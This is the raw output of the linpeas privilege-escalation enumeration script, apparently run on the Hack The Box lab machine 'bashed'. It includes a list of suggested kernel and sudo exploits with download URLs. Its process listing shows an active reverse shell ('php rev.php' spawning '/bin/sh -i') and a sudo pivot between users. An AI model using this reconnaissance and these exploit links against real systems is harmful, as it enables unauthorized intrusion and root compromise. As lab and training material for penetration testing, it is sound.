         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                 
    |---------------------------------------------------------------------------------|                 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                 
    |         Follow on Twitter         :     @hacktricks_live                        |                 
    |         Respect on HTB            :     SirBroccoli                             |                 
    |---------------------------------------------------------------------------------|                 
    |                                 Thank you!                                      |                 
    \---------------------------------------------------------------------------------/                 
          linpeas-ng by carlospolop                                                                     
                                                                                                        
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                              
                                                                                                        
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist                                                                                                       
 LEGEND:                                                                                                
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                     
                               ╚═══════════════════╝                                                    
OS: Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017
User & Groups: uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
Hostname: bashed
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                             
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                  
                                                                                                        
                                                                                                        

Caching directories DONE
                                                                                                        
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                      
                              ╚════════════════════╝                                                    
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                      
Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.2 LTS
Release:        16.04
Codename:       xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                         
Sudo version 1.8.16                                                                                     


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                 
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                  

╔══════════╣ Date & uptime
Wed Dec 13 04:11:22 PST 2023                                                                            
 04:11:22 up  2:05,  0 users,  load average: 0.00, 0.00, 0.00

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                    
sda
sda1
sda2
sda5

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                               
UUID=3e4c92bc-8e6f-4a49-90e7-89274a4755c3 /               ext4    errors=remount-ro 0       1           
UUID=84ec3632-89e9-4e4d-88b4-afcbbc06a03b none            swap    sw              0       0
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                 
SUDO_GID=33                                                                                             
HISTFILESIZE=0
MAIL=/var/mail/scriptmanager
USER=scriptmanager
LANGUAGE=en_US:
SHLVL=1
HOME=/home/scriptmanager
SUDO_UID=33
LOGNAME=scriptmanager
_=./linpeas
TERM=unknown
USERNAME=scriptmanager
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
LANG=C
HISTSIZE=0
SUDO_COMMAND=/bin/bash
SHELL=/bin/bash
SUDO_USER=www-data
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed  
dmesg Not Found                                                                                         
                                                                                                        
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                      
[+] [CVE-2017-16995] eBPF_verifier                                                                      

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: highly probable
   Tags: [ ubuntu=(14.04|16.04){kernel:4.4.0-62-generic} ]
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: probable
   Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                 
  [1] af_packet                                                                                         
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.           
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                
═╣ PaX bins present? .............. PaX Not Found                                                       
═╣ Execshield enabled? ............ Execshield Not Found                                                
═╣ SELinux enabled? ............... sestatus Not Found                                                  
═╣ Seccomp enabled? ............... disabled                                                            
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... disabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                        

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                     
                                   ╚═══════════╝                                                        
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?                                                                          
╔══════════╣ Container details                                                                          
═╣ Is this a container? ........... No                                                                  
═╣ Any running containers? ........ No                                                                  
                                                                                                        

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                     
                                     ╚═══════╝                                                          
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                      
                ╚════════════════════════════════════════════════╝                                      
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                     
root          1  0.0  0.5  37828  5868 ?        Ss   02:05   0:01 /sbin/init noprompt                   
root        313  0.0  0.2  28332  2632 ?        Ss   02:05   0:00 /lib/systemd/systemd-journald
root        353  0.0  0.0 158624   272 ?        Ssl  02:05   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
root        376  0.0  0.3  44256  3752 ?        Ss   02:05   0:00 /lib/systemd/systemd-udevd
systemd+    477  0.0  0.2 100324  2604 ?        Ssl  02:05   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root        604  0.0  0.2  20100  2752 ?        Ss   02:05   0:00 /lib/systemd/systemd-logind
root        607  0.0  0.3  29008  3012 ?        Ss   02:05   0:00 /usr/sbin/cron -f
root        609  0.0  0.8 275864  8068 ?        Ssl  02:05   0:00 /usr/lib/accountsservice/accounts-daemon[0m                                                                                                   
syslog      618  0.0  0.5 256396  5384 ?        Ssl  02:05   0:00 /usr/sbin/rsyslogd -n
message+    633  0.0  0.4  42900  4044 ?        Ss   02:05   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
root        647  0.0  1.0 118500 10048 ?        Ss   02:05   0:07 /usr/bin/vmtoolsd
root        712  0.0  0.1  15940  1772 tty1     Ss+  02:06   0:00 /sbin/agetty --noclear tty1 linux
root        835  0.0  2.4 255896 24596 ?        Ss   02:06   0:00 /usr/sbin/apache2 -k start
www-data    931  0.0  1.2 256404 12048 ?        S    02:12   0:00  _ /usr/sbin/apache2 -k start
www-data    933  0.0  1.2 256372 12388 ?        S    02:12   0:00  _ /usr/sbin/apache2 -k start
www-data   1099  0.0  0.0   4508   748 ?        S    02:26   0:00  |   _ sh -c cd /home/arrexel; ping 10.10.14.18 2>&1
www-data   1100  0.0  0.0   6536   668 ?        S    02:26   0:01  |       _ ping 10.10.14.18
www-data    934  0.0  1.2 256380 11996 ?        S    02:12   0:00  _ /usr/sbin/apache2 -k start
www-data    950  0.0  1.2 256388 12056 ?        S    02:15   0:00  _ /usr/sbin/apache2 -k start
www-data    955  0.0  1.2 256372 11980 ?        S    02:15   0:00  _ /usr/sbin/apache2 -k start
www-data    961  0.0  1.2 256388 12012 ?        S    02:15   0:00  _ /usr/sbin/apache2 -k start
www-data    994  0.0  1.2 256380 12104 ?        S    02:15   0:00  _ /usr/sbin/apache2 -k start
www-data    996  0.0  1.2 256372 11984 ?        S    02:15   0:00  _ /usr/sbin/apache2 -k start
www-data   1006  0.0  1.1 256204 11456 ?        S    02:15   0:00  _ /usr/sbin/apache2 -k start
www-data   1095  0.0  0.0   4508   704 ?        S    02:26   0:00  |   _ sh -c cd /home/arrexel; ping 10.10.14.18 2>&1
www-data   1096  0.0  0.0   6536   712 ?        S    02:26   0:01  |       _ ping 10.10.14.18
www-data   1007  0.0  1.1 256280 11836 ?        S    02:15   0:00  _ /usr/sbin/apache2 -k start
www-data  48271  0.0  0.0   4508   752 ?        S    02:40   0:00  |   _ sh -c cd /home/scriptmanager; ping 10.10.14.18 2>&1
www-data  48272  0.0  0.0   6536   700 ?        S    02:40   0:00  |       _ ping 10.10.14.18
www-data  16333  0.0  1.2 256380 11988 ?        S    02:29   0:00  _ /usr/sbin/apache2 -k start
www-data  80345  0.0  0.7 255968  7704 ?        S    03:53   0:00  _ /usr/sbin/apache2 -k start
www-data  48337  0.0  0.7 130440  7436 ?        Ss   02:51   0:00 php rev.php
www-data  48338  0.0  0.0   4508   844 ?        S    02:51   0:00  _ sh -c uname -a; w; id; /bin/sh -i
www-data  48342  0.0  0.1   4508  1560 ?        S    02:51   0:00      _ /bin/sh -i
root      80399  0.0  0.3  49792  3480 ?        S    04:07   0:00          _ sudo -u scriptmanager /bin/bash
scriptm+  80400  0.0  0.2   9564  2576 ?        S    04:07   0:00              _ /bin/bash
scriptm+  80464  0.0  0.5 704124  5044 ?        Sl   04:11   0:00                  _ ./linpeas
scriptm+  80468  0.0  0.0   4388   680 ?        S    04:11   0:00                      _ base64 -d
scriptm+  80469  0.3  0.2   5296  2540 ?        S    04:11   0:00                      _ /bin/sh
scriptm+  84770  0.0  0.1   5296  1008 ?        S    04:11   0:00                          _ /bin/sh
scriptm+  84774  0.0  0.3  34724  3180 ?        R    04:11   0:00                          |   _ ps fauxwww                                                                                                     
scriptm+  84773  0.0  0.1   5296  1008 ?        S    04:11   0:00                          _ /bin/sh

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                            
-rwxr-xr-x 1 www-data www-data 3235784 Dec 13 02:27 ./linpeas                                           
-rwxr-xr-x 1 root     root     1037528 Jun 24  2016 /bin/bash
lrwxrwxrwx 1 root     root           4 Dec  4  2017 /bin/sh -> dash
-rwxr-xr-x 1 root     root      326224 Jan 18  2017 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root     root      618520 Jan 18  2017 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root     root      141904 Jan 18  2017 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root     root      453240 Jan 18  2017 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root     root       44104 Dec 16  2016 /sbin/agetty
lrwxrwxrwx 1 root     root          20 Dec  4  2017 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root     root      224208 Jan 12  2017 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root     root       44528 Feb  9  2017 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root     root      164928 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon[0m
-rwxr-xr-x 1 root     root      662496 Sep 18  2017 /usr/sbin/apache2
-rwxr-xr-x 1 root     root       44472 Apr  5  2016 /usr/sbin/cron
-rwxr-xr-x 1 root     root      599328 Apr  5  2016 /usr/sbin/rsyslogd

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                               
Proc 477 with ppid 1 is run by user systemd-timesync but the ppid user is root                          
Proc 618 with ppid 1 is run by user syslog but the ppid user is root
Proc 633 with ppid 1 is run by user messagebus but the ppid user is root
Proc 931 with ppid 835 is run by user www-data but the ppid user is root
Proc 933 with ppid 835 is run by user www-data but the ppid user is root
Proc 934 with ppid 835 is run by user www-data but the ppid user is root
Proc 950 with ppid 835 is run by user www-data but the ppid user is root
Proc 955 with ppid 835 is run by user www-data but the ppid user is root
Proc 961 with ppid 835 is run by user www-data but the ppid user is root
Proc 994 with ppid 835 is run by user www-data but the ppid user is root
Proc 996 with ppid 835 is run by user www-data but the ppid user is root
Proc 1006 with ppid 835 is run by user www-data but the ppid user is root
Proc 1007 with ppid 835 is run by user www-data but the ppid user is root
Proc 16333 with ppid 835 is run by user www-data but the ppid user is root
Proc 48337 with ppid 1 is run by user www-data but the ppid user is root
Proc 80345 with ppid 835 is run by user www-data but the ppid user is root
Proc 80400 with ppid 80399 is run by user scriptmanager but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information      
COMMAND     PID   TID             USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME                       

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory      
gdm-password Not Found                                                                                  
gnome-keyring-daemon Not Found                                                                          
lightdm Not Found                                                                                       
vsftpd Not Found                                                                                        
apache2 process found (dump creds from memory as root)                                                  
sshd Not Found
                                                                                                        
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                  
/usr/bin/crontab                                                                                        
incrontab Not Found
-rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab                                                

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Jun  2  2022 .
drwxr-xr-x 89 root root 4096 Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  670 Mar  1  2016 php
-rw-r--r--  1 root root  191 Dec  4  2017 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Jun  2  2022 .
drwxr-xr-x 89 root root 4096 Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  539 Apr  5  2016 apache2
-rwxr-xr-x  1 root root 1474 Jan 17  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  5  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  435 Nov 17  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jun  2  2022 .
drwxr-xr-x 89 root root 4096 Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jun  2  2022 .
drwxr-xr-x 89 root root 4096 Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Jun  2  2022 .
drwxr-xr-x 89 root root 4096 Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db

/var/spool/cron/crontabs:
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
-????????? ? ? ? ?            ? root

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths          
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                       

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                             
/etc/systemd/system/multi-user.target.wants/networking.service could be executing some relative path    
/etc/systemd/system/network-online.target.wants/networking.service could be executing some relative path
/etc/systemd/system/sysinit.target.wants/friendly-recovery.service could be executing some relative path
/lib/systemd/system/emergency.service could be executing some relative path
/lib/systemd/system/friendly-recovery.service could be executing some relative path
/lib/systemd/system/ifup@.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                               
NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
Wed 2023-12-13 10:58:27 PST  6h left  Wed 2023-12-13 02:05:59 PST  2h 5min ago  apt-daily.timer              apt-daily.service
Thu 2023-12-14 02:21:01 PST  22h left Wed 2023-12-13 02:21:01 PST  1h 50min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service                                                                     
n/a                          n/a      n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                               
                                                                                                        
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                              
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                                                                     
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                         
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                        
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                 
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                 
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                                
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                             
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                                      
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                                      
